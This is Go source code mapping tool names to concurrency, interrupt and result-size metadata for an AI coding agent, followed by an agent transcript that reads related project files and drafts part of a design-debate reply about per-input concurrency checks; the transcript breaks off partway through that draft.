//	lsp          |    Y     |      N      |     N     |       N
//	free_fork    |    N     |      N      |     Y     |       N
//	query_diagnostics | Y   |      N      |     N     |       Y
//	verify_plan_execution | Y |    N      |     N     |       N
//	delegate_*   |    N     |      N      |     Y     |       N
//	task_output  |    Y     |      N      |     N     |       Y
//	ask_user_question | Y  |      N      |     Y     |       N
//
// Tools not in the table get all-false (the conservative default; the
// surface MUST still emit a non-zero bool combination, so callers SHOULD
// extend this map when adding new tools).
type orthogonalFlags = contracts.ToolSpec // alias for the 4 bools

// OrthogonalFlagFor returns the 4 bool flags for a given tool name.
// Falls back to all-false for unknown names; this matches the design's
// "conservative default" rule (T22 assertion: at least one bool must be true).
func OrthogonalFlagFor(toolName string) (readOnly, destructive, openWorld, concurrencySafe bool) {
	switch toolName {
	case "read_file":
		return true, false, false, true
	case "write_file":
		return false, true, false, false
	case "edit_file":
		return false, true, false, false
	case "bash":
		return false, true, false, true
	case "grep":
		return true, false, false, true
	case "glob":
		return true, false, false, true
	case "lsp",
		"lsp_go_to_definition",
		"lsp_find_references",
		"lsp_incoming_calls",
		"lsp_hover",
		"lsp_workspace_symbol":
		return true, false, false, false
	case "free_fork":
		return false, false, true, false
	case "query_diagnostics":
		return true, false, false, true
	case "ask_user_question":
		return true, false, true, false
	case "verify_plan_execution":
		return true, false, false, false
	}
	// delegate_*, task_output, etc. follow a "spawn-agents" / "read-result"
	// rule below.
	switch {
	case hasPrefix(toolName, "delegate_"):
		return false, false, true, false
	case toolName == "task_output" || hasPrefix(toolName, "task_"):
		return true, false, false, true
	}
	return false, false, false, false
}

// InterruptBehaviorFor returns the InterruptMode for a given tool name.
// Only long-run tools (free_fork, delegate_*, ask_user_question) opt
// into InterruptCancel. Everything else (and unknown names) is
// InterruptBlock.
//
// TOOL-SURFACE-1-A01-F05 (DM-20260618-001): the surface MUST return this
// from InterruptBehavior and (for InterruptCancel) select on ctx.Done()
// inside Execute.
//
// ask_user_question (DM-20260618-006) opts into InterruptCancel so the
// D7 runLoop can abort a pending question when the user issues a new
// message mid-turn.
func InterruptBehaviorFor(toolName string) contracts.InterruptMode {
	switch toolName {
	case "free_fork", "ask_user_question":
		return contracts.InterruptCancel
	}
	if hasPrefix(toolName, "delegate_") {
		return contracts.InterruptCancel
	}
	return contracts.InterruptBlock
}

func hasPrefix(s, prefix string) bool {
	if len(s) < len(prefix) {
		return false
	}
	return s[:len(prefix)] == prefix
}

// ShouldDeferByDefault returns true for tools whose full schema is omitted
// from the default system prompt and must be retrieved on demand via
// tool_search. The 6 hardcoded candidates are:
//   - delegate_* (5: delegate_explore / delegate_status / delegate_status_all
//     / delegate_plan / delegate_research) — spawns child agent, rarely
//     invoked outside plan-mode finalization.
//   - task_output_background (1: suffix match) — polling helper, low value.
//
// tool_search itself MUST always return false (otherwise deadlock).
//
// DSAFT: TOOL-SURFACE-1-A01-F08 (DM-20260618-003 devrix-surface-lazy-loading).
func ShouldDeferByDefault(toolName string) bool {
	if toolName == "tool_search" {
		return false
	}
	if hasPrefix(toolName, "delegate_") {
		return true
	}
	if hasPrefix(toolName, "task_") && toolName == "task_output_background" {
		return true
	}
	// Also catch `*_background` suffix generally (defensive for future tools).
	if len(toolName) > len("_background") &&
		toolName[len(toolName)-len("_background"):] == "_background" {
		return true
	}
	return false
}

// AllowAllCheckPermission is the default CheckPermission implementation
// for surfaces without per-tool policy. It returns DecisionAllow
// unconditionally. ToolSurface implementations can embed
// allowAllChecker to satisfy the interface with one line.
//
// DSAFT: TOOL-SURFACE-1-A01-F07 (DM-20260618-002 — see PR #68 for full
// integration; here we provide the helper so every surface compiles
// under the ToolSurface v2 contract).
type allowAllChecker struct{}

func (allowAllChecker) CheckPermission(_ context.Context, _ contracts.ToolSpec, _ json.RawMessage) contracts.Decision {
	return contracts.DecisionAllow
}

// --- ToolSpec v3 control plane metadata (D2-S15-A02-T08) -----------------
//
// DefaultV3MetadataFor returns the 6 control plane fields for the named
// tool. DSAFT: D2-S15-A02-T08 (19 tools explicit default metadata — the
// 治本 narrative MUST NOT defer to a Phase E migration).
//
// The returned tuple is the per-tool truth table for the 6 v3 fields.
// T14 (surface_metadata_gate_test.go) enforces that every registered
// surface's Tools() returns specs whose v3 fields are non-default
// (i.e., DefaultV3MetadataFor has been applied with the correct name).
//
// Naming convention:
//   read_file / grep / glob   → Probe + Bounded(15)  (H12 consensus:
//                              "re-read in self-loop recovery" is Probe)
//   write_file/edit_file/bash → Action + StateChangeRequired
//   lsp_*                     → Fact for read-only methods, Probe for
//                              workspace_symbol / code_action
//   free_fork                 → Experiment + Quotient(0.8)
//   delegate_*                → Probe + EvidenceRequired(min=1) + Bounded(3)
//   task_*                    → Action + Bounded(n) per tool
func DefaultV3MetadataFor(toolName string) (contracts.EmissionClass, contracts.ConvergenceContract, contracts.IterationBound, contracts.SourceUncertainty, int, string) {
	const (
		// Per-tool persistence thresholds (DM-20260702-008 / D2-S15-A02-T07).
		// Mirrors clawcode DEFAULT_MAX_RESULT_SIZE_CHARS = 50_000 +
		// per-tool overrides. We keep them per-tool because the LLM's
		// recovery style varies — Read re-reads via offset/limit so 8K is
		// fine, Bash output is re-issued so 30K is the sweet spot, etc.
		//
		// The growthbook override (persist.GetPersistenceThreshold) can
		// shift individual tools up or down at runtime without recompile.
		maxCharsReadFile        = 8 * 1024   // 8K  — Read re-reads via offset/limit
		maxCharsGrepGlob        = 20 * 1024  // 20K — match clawcode grep/glob
		maxCharsBash            = 30 * 1024  // 30K — bash output re-issued
		maxCharsEditWrite       = 100 * 1024 // 100K — Edit/Write/NotebookEdit/Web*/LSP/Agent/Task/Plan
		maxCharsMCPAuth         = 10 * 1024  // 10K — MCP auth responses
		maxCharsAskUserQuestion = 4 * 1024   // 4K  — small UX surface
		maxCharsToolSearch      = 4 * 1024   // 4K  — list-of-tools response
		maxCharsLSPRead         = 4 * 1024   // 4K  — go-to-def / hover / etc.
		maxCharsTaskStop        = 2 * 1024   // 2K  — control message
	)
	marker := contracts.DefaultTruncateMarkerText

	switch toolName {
	case "read_file":
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			// DM-20260702-008 / D2-S15-A02-T11: read_file is the recovery
			// path (offset/limit re-reads, T10). OpenEnded is correct
			// because the LLM uses Read to recover from oversized
			// results, NOT to discover content. The bound is preserved
			// as MaxN for dashboards but the channel no longer hard-rejects.
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsReadFile, marker
	case "write_file":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_StateChangeRequired},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 8},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsEditWrite, marker
	case "edit_file":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_StateChangeRequired},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 8},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsEditWrite, marker
	case "bash":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_StateChangeRequired},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 10},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsBash, marker
	case "grep":
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			// T11: OpenEnded — see read_file above.
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsGrepGlob, marker
	case "glob":
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			// T11: OpenEnded — see read_file above.
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsGrepGlob, marker
	case "query_diagnostics":
		return contracts.EC_Fact,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	case "verify_plan_execution":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_StateChangeRequired},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	case "ask_user_question":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 2},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsAskUserQuestion, marker
	case "tool_search":
		return contracts.EC_Fact,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_LLM, Value: 0.4},
			maxCharsToolSearch, marker
	case "lsp_go_to_definition", "lsp_find_references", "lsp_incoming_calls", "lsp_hover":
		return contracts.EC_Fact,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsLSPRead, marker
	case "lsp_workspace_symbol":
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 5},
			contracts.SourceUncertainty{Source: contracts.SK_LLM, Value: 0.4},
			maxCharsLSPRead, marker
	case "lsp_code_action":
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_LLM, Value: 0.4},
			maxCharsLSPRead, marker
	case "free_fork":
		return contracts.EC_Experiment,
			contracts.ConvergenceContract{Kind: contracts.CC_QuotientThreshold, Threshold: 0.8},
			contracts.IterationBound{Kind: contracts.IB_Quotient, Quotient: 0.8},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsEditWrite, marker
	case "task_output":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 5},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	case "task_stop":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_StateChangeRequired},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 1},
			contracts.SourceUncertainty{Source: contracts.SK_User, Value: 0.85},
			maxCharsTaskStop, marker
	case "task_list_background":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	case "task_output_background":
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	}

	// Pattern-based fallbacks (delegate_*, task_*, lsp_*).
	if hasPrefix(toolName, "delegate_") {
		return contracts.EC_Probe,
			contracts.ConvergenceContract{Kind: contracts.CC_EvidenceRequired, MinEvidence: 1},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_LLM, Value: 0.4},
			maxCharsEditWrite, marker
	}
	if hasPrefix(toolName, "task_") {
		return contracts.EC_Action,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_Bounded, MaxN: 3},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsEditWrite, marker
	}
	if hasPrefix(toolName, "lsp_") {
		return contracts.EC_Fact,
			contracts.ConvergenceContract{Kind: contracts.CC_None},
			contracts.IterationBound{Kind: contracts.IB_OpenEnded},
			contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 1.0},
			maxCharsLSPRead, marker
	}

	// Unknown tool name — T14 gate will fail the build. Returning the
	// zero defaults lets a fresh ToolSpec compile cleanly; the gate
	// prevents any registered surface from hitting this path.
	return contracts.EC_Action,
		contracts.ConvergenceContract{Kind: contracts.CC_None},
		contracts.IterationBound{Kind: contracts.IB_OpenEnded},
		contracts.SourceUncertainty{Source: contracts.SK_Deterministic, Value: 0.0},
		0, ""
}

// ApplyV3Metadata fills the 6 ToolSpec v3 control plane fields on the
// given spec from DefaultV3MetadataFor. Surface implementations call
// this once per tool after constructing the v2 9-field spec.
//
// DSAFT: D2-S15-A02-T08 (truth table) + T09/T10/T11 (surface call sites)
// + T14 (gate test forbids any registered spec from skipping this call).
func ApplyV3Metadata(spec *contracts.ToolSpec, toolName string) {
	ec, cc, ib, su, max, marker := DefaultV3MetadataFor(toolName)
	spec.EmissionClass = ec
	spec.ConvergenceContract = cc
	spec.IterationBound = ib
	spec.SourceUncertainty = su
	spec.MaxResultSizeChars = max
	spec.TruncateMarkerText = marker
}

codex
Now let me check the GrowthBook override file and some other key files.

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/persist/growthbook_override.go 2>/dev/null || find /Users/fukai/workspace/devrix -name "growthbook*" -o -name "*growthbook*" 2>/dev/null | head -5' in /Users/fukai/workspace/devrix
 succeeded in 108ms:
/Users/fukai/workspace/devrix/internal/layers/contextengine/persist/growthbook_override.go
/Users/fukai/workspace/devrix/internal/layers/contextengine/persist/growthbook_override_test.go

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/openspec/tech-debt/streaming-tool-executor-v2.md 2>/dev/null | head -100' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
# Tech Debt: StreamingToolExecutor 二期对齐（clawcode 参照）

**来源：** clawcode `src/services/tools/StreamingToolExecutor.ts` vs Devrix `query/streaming_executor.go`
**主路径：** DM-20260610-012 QueryLoop（v1 基础版已交付）
**承载 change:** **DM-20260702-009 (D2 Tool Input-Aware Concurrency + Auto-Mode Security Classifier)** — 4 项关闭, 2 项保留
**状态:** 4/6 CLOSED (TD-STE-01/02/03/06) + 2/6 保留 (TD-STE-04/05, P2)
**优先级:** P0 (CLOSED 项) + P2 (保留项)

## 状态总览

| TD ID | 标题 | 状态 | 关闭路径 |
|-------|------|------|----------|
| TD-STE-01 | 混合批次调度 | **CLOSED** by DM-20260702-009 **T18** (partitionToolCalls) | 走 PR-B |
| TD-STE-02 | Bash sibling abort | **CLOSED** by DM-20260702-009 **T26** (siblingAbortController) | 走 PR-F |
| TD-STE-03 | fallback 时 discard 在途工具 | **CLOSED** by DM-20260702-009 **T27** (StreamingToolExecutor.Discard) | 走 PR-F (依赖 TD-QL-03 CLOSED, DM-20260618-010) |
| TD-STE-04 | 工具 progress 流 | 保留 P2 | OOS-NEW-7 |
| TD-STE-05 | synthetic error 统一 | 保留 P2 | OOS-NEW-8 |
| TD-STE-06 | ConcurrencySafe 注册表 | **CLOSED** by DM-20260702-009 **T16-T17** (per-input IsConcurrencySafe) | 走 PR-A |

## 背景

Devrix v1 `StreamingToolExecutor` 仅在 **整批工具全部 concurrency-safe** 时才并行。
clawcode 支持 **混合批次**（只读工具并行 + 写工具独占）、并行 Bash 兄弟取消、fallback discard、执行中 progress 流式输出。

## 现状 vs 目标 (历史快照, 已被本 doc 关闭)

| 能力 | Devrix v1 | clawcode | 目标 / 状态 |
|------|-----------|----------|------|
| 混合批次并发 | 全 safe 才并行 | safe 可与 safe 并行；unsafe 独占 | **TD-STE-01 → CLOSED T18** |
| Bash 并行 sibling abort | 无 | `siblingAbortController` | **TD-STE-02 → CLOSED T26** |
| fallback 时 discard 在途工具 | 无 | `discard()` + synthetic error | **TD-STE-03 → CLOSED T27** |
| 工具 progress 中途 yield | agent tool stream only | `pendingProgress` 即时 yield | TD-STE-04 保留 P2 |
| 合成 error 类型 | permission/exec | sibling_error / interrupted / streaming_fallback | TD-STE-05 保留 P2 |
| per-tool `isConcurrencySafe` | 硬编码 switch | 工具定义回调 | **TD-STE-06 → CLOSED T16-T17** |

---

## CLOSED 项 — 关闭记录

### TD-STE-01: 混合批次调度 — CLOSED by T18

**参考:** clawcode `canExecuteTool` + `processQueue`

**关闭路径:** DM-20260702-009 T18 partitionToolCalls 改造
- `internal/bootstrap/turn_adapter.go:277` 改造为 `partitionToolCalls` batch 模式
- batch 间串行 (LLM 顺序保留) + batch 内并发 (errgroup, 9 并发阈值)
- 仿 clawcode `src/services/tools/toolOrchestration.ts:84-118`

**关闭时间:** 计划 W1 D3-D5 (PR-B)

**回归基线:** `review50_e2e_concurrent_test.go` (T19) — 50 read_file 拆 ~10 batch, 总 wall time < 串行 / 3

### TD-STE-02: Bash sibling abort — CLOSED by T26

**参考:** clawcode `createChildAbortController(toolUseContext.abortController)`

**关闭路径:** DM-20260702-009 T26 BashTool siblingAbortController 集成
- `internal/layers/contextengine/enforce/tools/bash/sibling_abort.go` 新建
- 仅 abort 同 batch 并行 Bash 兄弟, **不** abort 父 QueryLoop turn
- 兄弟 Bash 返 synthetic `tool_result`: `Cancelled: parallel tool call errored`

**关闭时间:** 计划 W3 D1-D2 (PR-F)

**回归基线:** `sibling_abort_test.go` — mock 双 Bash, 第一个 error → 第二个 cancelled

### TD-STE-03: discard on fallback — CLOSED by T27

**触发:** QueryLoop fallback model 切换前 (依赖 TD-QL-03)

**关闭路径:** DM-20260702-009 T27 StreamingToolExecutor.Discard() + fallback 路径 wiring
- `internal/bootstrap/streaming_executor.go` 新建 — Discard() 方法
- `internal/bootstrap/discard_on_fallback.go` 新建 — QueryLoop fallback 路径 wiring
- 在途/queued 工具注入 `streaming_fallback` synthetic result
- 新 iteration 使用 fresh executor

**前置依赖:** TD-QL-03 (DM-20260618-010) — 已 CLOSED, 不再阻塞

**关闭时间:** 计划 W3 D1-D2 (PR-F)

**回归基线:** `discard_on_fallback_test.go` — fallback 路径无 orphan tool_use

### TD-STE-06: ConcurrencySafe 注册表 — CLOSED by T16-T17

**参考:** clawcode Tool interface 35 字段中 `isConcurrencySafe(input)`

**关闭路径:** DM-20260702-009 T16-T17 ToolSurface v4 + 19 工具默认实现
- `internal/shared/contracts/tool_surface_v4.go` 新建 — interface 扩展
- `internal/layers/contextengine/enforce/tools/surface/orthogonal_flags_v2.go` 新建 — 19 工具默认
- 19 surface 加 `IsConcurrencySafe(input []byte) bool` 默认实现 (跟 clawcode TOOL_DEFAULTS 一致)

**关闭时间:** 计划 W1 D1-D2 (PR-A)

**回归基线:** `surface_metadata_gate_test.go` 加 1 case (AC8: 0 silent default)

---

## 保留项 (P2) — 走后续 change

### TD-STE-04: 工具 progress 流（P2）


exec
/bin/zsh -lc 'grep -r "persist/growthbook" /Users/fukai/workspace/devrix --include="*.go" -l 2>/dev/null | head -5' in /Users/fukai/workspace/devrix
 succeeded in 339ms:
exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/internal/layers/contextengine/persist/growthbook_override.go' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
// Package persist: T05 — growthbook override (DM-20260702-008 / D2-S15-A02-T05).
//
// Per-tool persistence threshold override. Mirrors clawcode
// toolResultStorage.ts:getPersistenceThreshold:51-78 + PERSIST_THRESHOLD_OVERRIDE_FLAG.
//
// Use case: roll out the 100K per-tool thresholds progressively by
// changing the override map for the 5% canary first, then 25%, 100%.
// The hardcoded per-tool values in orthogonal_flags.go stay as the
// "consensus" baseline; GB can shift individual tools up or down.
package persist

// PersistThresholdOverrideFlag is the growthbook flag name. Mirrors
// clawcode PERSIST_THRESHOLD_OVERRIDE_FLAG ("tengu_satin_quoll"). When
// the value is `{}` (the default), the override is a no-op and the
// declared per-tool MaxResultSizeChars wins. Per-tool entries in the
// map BYPASS the default's Math.min clamp and are used verbatim — the
// GB operator is trusted to set a sane value.
const PersistThresholdOverrideFlag = "devrix_persist_threshold_override"

// ThresholdOverride is a thread-safe view over a per-tool threshold map.
// The default zero value has an empty map and returns false from Lookup —
// callers fall through to the declared MaxResultSizeChars.
//
// Production code is expected to wire this to a growthbook client via
// the WithOverrides option. The current devrix tree has no growthbook
// dependency yet, so tests and the compression pipeline use a fresh
// ThresholdOverride{} and the per-tool declared values take effect
// unmodified.
type ThresholdOverride struct {
	// values is the parsed per-tool override map. Tools absent from the
	// map have no override and the caller falls through to the declared
	// per-tool MaxResultSizeChars.
	values map[string]int
}

// NewThresholdOverride returns an override view over the given map. The
// map is copied so subsequent mutations to the caller's map don't leak
// into the override (defense-in-depth against shared-growthbook-client
// reuse).
func NewThresholdOverride(values map[string]int) *ThresholdOverride {
	if len(values) == 0 {
		return &ThresholdOverride{}
	}
	copied := make(map[string]int, len(values))
	for k, v := range values {
		copied[k] = v
	}
	return &ThresholdOverride{values: copied}
}

// OverrideGetter is the minimal interface the compression pipeline
// needs to fetch a per-tool override. Production wires this to
// growthbook's getFeatureValue_CACHED; tests pass a closure backed by
// a map or a stub.
type OverrideGetter func() map[string]int

// GetPersistenceThreshold returns the effective persistence threshold
// for a tool. Resolution order:
//
//  1. declaredMaxResultSizeChars non-finite (Inf / NaN) → return as-is.
//     This is the clawcode "hard opt-out" case for Read: persisting its
//     own output to a file the model reads back is circular.
//  2. override present and finite positive → return override verbatim,
//     bypassing the Math.min clamp. The override operator is trusted.
//  3. default → return declaredMaxResultSizeChars.
//
// Defensive (mirrors clawcode:73-78): the override map may be served as
// nil/null from a misconfigured feature flag cache. The optional
// chaining and Number.isFinite-equivalent guards mean a bad flag value
// falls through to the hardcoded default instead of throwing or
// returning 0. We mirror this with explicit type/finite/positive checks.
func GetPersistenceThreshold(
	toolName string,
	declaredMaxResultSizeChars int,
	override *ThresholdOverride,
) int {
	// Step 1: hard opt-out (declared MaxResultSizeChars is Inf / -1 / 0
	// means "never persist"). Mirrors clawcode:60-62.
	if declaredMaxResultSizeChars <= 0 {
		return declaredMaxResultSizeChars
	}
	// Step 2: GB override present and sane.
	if override != nil {
		if v, ok := override.values[toolName]; ok && v > 0 {
			return v
		}
	}
	// Step 3: declared value wins.
	return declaredMaxResultSizeChars
}

// WithOverrides is a convenience for callers that have a getter but
// want to use the simpler GetPersistenceThreshold API. It calls
// getter() once and passes the result through NewThresholdOverride.
//
// If getter is nil, returns nil — meaning "no override configured,
// use declared values". This is the production path until the GB
// client is wired in.
func WithOverrides(getter OverrideGetter) *ThresholdOverride {
	if getter == nil {
		return nil
	}
	raw := getter()
	return NewThresholdOverride(raw)
}

exec
/bin/zsh -lc "grep -r \"growthbook\\|GrowthBook\" /Users/fukai/workspace/devrix --include=\"*.go\" -l 2>/dev/null | head -5" in /Users/fukai/workspace/devrix
 succeeded in 407ms:
/Users/fukai/workspace/devrix/internal/layers/contextengine/prepare/compression/persist.go
/Users/fukai/workspace/devrix/internal/layers/contextengine/enforce/tools/surface/orthogonal_flags.go
/Users/fukai/workspace/devrix/internal/layers/contextengine/persist/growthbook_override.go
/Users/fukai/workspace/devrix/internal/layers/contextengine/persist/growthbook_override_test.go

exec
/bin/zsh -lc 'cat /Users/fukai/workspace/devrix/internal/layers/contextengine/prepare/compression/persist.go | head -60' in /Users/fukai/workspace/devrix
 succeeded in 0ms:
// Package compression: T01 — PersistToFile (DM-20260702-008 / D2-S15-A02-T01).
//
// Replaces the 8K TruncateToTokens self-loop with on-disk persistence +
// <persisted-output> XML reference, mirroring clawcode's
// src/utils/toolResultStorage.ts:persistToolResult + buildLargeToolResultMessage.
// Information is NEVER physically lost: the LLM can Read the saved file
// to recover the full payload via the offset/limit path (T10).
package compression

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unicode/utf8"

	"github.com/devrix/devrix/internal/layers/contextengine/prepare/persist"
)

// PersistedOutputTag wraps the preview message in an XML tag that
// downstream code (and the LLM itself) can detect to distinguish a
// persisted-result reference from full inline content.
//
// Mirrors clawcode PERSISTED_OUTPUT_TAG.
const PersistedOutputTag = "<persisted-output>"

// PersistedOutputClosingTag is the matching closing tag.
const PersistedOutputClosingTag = "</persisted-output>"

// PreviewSizeBytes is the byte cap for the inline preview kept in-band
// after persistence. Mirrors clawcode PREVIEW_SIZE_BYTES = 2000.
const PreviewSizeBytes = 2000

// toolResultsSubdir is the on-disk subdirectory under the session dir.
// Mirrors clawcode TOOL_RESULTS_SUBDIR.
const toolResultsSubdir = "tool-results"

// PersistedToolResult describes the artifact of a successful PersistToFile.
type PersistedToolResult struct {
	// FilePath is the on-disk location of the full content.
	FilePath string
	// OriginalSize is the byte length of the full content (pre-persistence).
	OriginalSize int
	// Preview is the head of the content, truncated at a newline boundary
	// when possible and capped at PreviewSizeBytes.
	Preview string
	// HasMore reports whether the preview was truncated.
	HasMore bool
}

// PersistToFileError reports why persistence failed. Callers fall back
// to truncate-with-marker on this case so the task is NEVER abandoned.
type PersistToFileError struct {
	Reason string
	Cause  error
}

func (e *PersistToFileError) Error() string {
	if e.Cause != nil {
		return fmt.Sprintf("persist: %s: %v", e.Reason, e.Cause)

exec
/bin/zsh -lc "cat /Users/fukai/workspace/devrix/internal/bootstrap/turn_adapter.go | grep -n \"concurrency\\|ConcurrencySafe\\|partition\" | head -20" in /Users/fukai/workspace/devrix
 succeeded in 0ms:
277:// tool calls marked ConcurrencySafe=true on their ToolSpec run in
311:	concSafe := a.concurrencyMap()
456:// concurrencyMap builds a toolName → ConcurrencySafe lookup from the
462:func (a *contextEngineAdapter) concurrencyMap() map[string]bool {
469:			m[sp.Name] = sp.ConcurrencySafe

codex
Now I have all the context I need. Let me compose the Round 2 defense.

Reading Round 1 materials to understand Claude's 12 questions, then composing the Round 2 defense with answers, concessions, and final positions.
  → Read all Round 1 materials and source files
  • Compose Round 2 defense with 12 Q&A + concession matrix
codex
Now composing the full Round 2 defense:

exec
/bin/zsh -lc "cat << 'ROUND2_DEFENSE'
# Round 2 答辩 — Codex (MiniMax-M2.7) 对 Claude 12 反问的回应

**日期:** 2026-07-02
**立场:** Round 0 → Round 2 演变 (有让步)

---

## Q1: 15 工具的 IsConcurrencySafe 函数体长什么样? \"节省 80%\" 是否高估?

**我的回答:**

全函数化方案中, 15 个永远不需要 per-input 决策的工具, 函数体确实是 boilerplate:

"'```go
// 15 工具: read_file, write_file, edit_file, grep, glob, lsp, 
//          free_fork, query_diagnostics, verify_plan_execution,
//          delegate_* (5), task_* (2), ask_user_question
func (s *ReadFileSurface) IsConcurrencySafe(input []byte) bool {
    return true  // s.ConcurrencySafe, 一行
}
func (s *WriteFileSurface) IsConcurrencySafe(input []byte) bool {
    return false
}
// grep, glob, query_diagnostics, task_output 同上 return true
// write_file, edit_file, lsp, free_fork, delegate_* 同上 return false
// ask_user_question: return false
```

19 工具 × 1 函数 ≈ 57 行 (不是 600 行, Claude 的 600 行高估了)
实际全函数化: ~57 行函数体 + 19 × 3 单测 ≈ 114 行
分层混合: 1 个 default router (~20 行) + 4 个 override (~80 行) + 4 × 3 单测 ≈ 132 行

**节省比例 ≈ 0%, 实际上分层混合还略多行。**

"节省 80%" 是基于"19 工具 × 函数体 = 大量代码"的前提, 但 15 工具的函数体是 1 行, 所以这个数字是**高估**。

**但核心论点不变:** 表达力不对称 — 15 工具永远不需要 input 参数来决定并发安全, 写函数是语义冗余; 4 工具确实需要 input 参数。YAGNI 原则对 15 工具成立。

**让步:** 是。但让步理由是数字修正, 不是方向修正 — 分层混合的工程价值在于"语义正确" (只有需要 input 的工具才有 override), 而非"节省代码行数"。

---

## Q2: 分层混合的 4 工具 override 完整列表 + 判定规则

**完整 4 工具:**

| # | 工具 | override 判定规则 | override 返回 false 的条件 |
|---|------|------------------|--------------------------|
| 1 | **Bash** | `isReadOnly(command)` — 解析 command tree | compound command 中含任意 destructive subcommand (rm, dd, mkfs, chmod 777, sudo 等) → 串行; 纯 read-only (ls, cat, grep, find) → 并发 |
| 2 | **read_file** | 文件 size > 某阈值 (建议 1MB) | 截断导致 8K 输出且需并发 → 串行 (避免 N 次截断串行化); 小文件读任意并发 |
| 3 | **edit_file** | 同 target path 互斥 | 当前 batch 中已有另一个 edit_file/write_file targeting 相同路径 → 串行 |
| 4 | **write_file** | 同 target path 互斥 | 同上, 路径相同则串行 |

**Default router (1 个):** 所有其他 15 工具 → 直接返回 `s.ConcurrencySafe` (即 `orthogonal_flags.go` 静态值)。

**澄清 Round 0 偏差:** Round 0 我只列了 Bash, 漏了 read_file (size-based) 和 edit_file/write_file (path-based)。这三个确实需要 input-aware 决策, 不是纯静态。修正立场: **4 工具 override, 不是 1 工具 override**。

**让步:** 是 — 修正 override 数量从 1 到 4。

---

## Q3: 从默认静态迁移到 per-input 函数的迁移路径

**迁移路径 (不破坏现有 15 工具):**

**Phase 1 (本 change):** ToolSurface interface 新方法:
```go
IsConcurrencySafe(input []byte) bool
```
- 加 `defaultIsConcurrencySafe` 辅助: 读取 `s.ConcurrencySafe` 字段
- 19 工具的现有实现 = `return defaultIsConcurrencySafe(s, input)` — 零行为改变
- Bash, read_file, edit_file, write_file 覆盖此方法

**Phase 2 (未来某工具 X 需要 per-input):**
1. 给 XSurface 加 override 方法, 读 input 做决策
2. 不需要改 interface, 不需要改 default router
3. 其他 15 工具保持不变

**迁移摩擦:** 几乎为零。现有 15 工具的 `IsConcurrencySafe` 方法体 = 1 行改动 (`defaultIsConcurrencySafe` 辅助调用)。

